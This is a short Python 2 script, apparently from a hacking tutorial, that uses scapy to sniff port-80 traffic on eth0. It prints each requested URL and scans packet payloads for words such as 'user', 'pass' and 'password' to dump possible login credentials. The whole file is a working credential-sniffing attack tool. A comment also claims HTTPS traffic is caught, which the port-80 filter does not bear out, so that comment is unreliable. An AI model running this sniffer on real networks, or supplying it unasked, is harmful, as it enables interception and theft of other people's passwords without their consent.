#!/usr/bin/python2

import scapy.all as scapy
from scapy.layers import http


# scapy.sniff to sniff the packet in specified interface and said not to keep in buffer by store=False
# prn is the callback function, called for every packet sniffed
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 80")
    # only port 80 that is http traffic will be sniffed and https also which is http+ssl traffic


def geturl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)  # access load field inside Raw layer of packet
        keywords = ['login', 'LOGIN', 'user', 'pass', 'username', 'password', 'Login']
        for keyword in keywords:  # print load only if it has any of these keywords
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())  # shows the layers inside each packet like http tcp ethernet
        url = geturl(packet)
        print("[+]HTTPRequest > " + str(url))  # can also use url.decode to convert bytes object to string

        login_info = get_login_info(packet)

        if login_info:
            print("\n\n[+]Possible username and password " + login_info + "\n\n")


sniff('eth0')
